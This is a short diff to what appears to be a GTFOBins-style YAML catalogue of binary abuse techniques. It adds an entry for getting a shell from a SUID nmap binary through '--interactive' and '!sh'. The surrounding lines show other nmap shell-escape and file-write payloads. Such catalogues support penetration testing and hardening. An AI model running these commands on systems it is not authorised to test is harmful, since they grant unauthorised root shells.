@@ -116,6 +116,10 @@ functions:
         echo 'os.execute("/bin/sh")' > $TF
         ./nmap --script=$TF
   suid:
+    - description: Works on older nmap versions.
+      code: |
+        ./nmap --interactive
+        !sh
     - description: The payload appears inside the regular nmap output.
       code: |
         LFILE=file_to_write
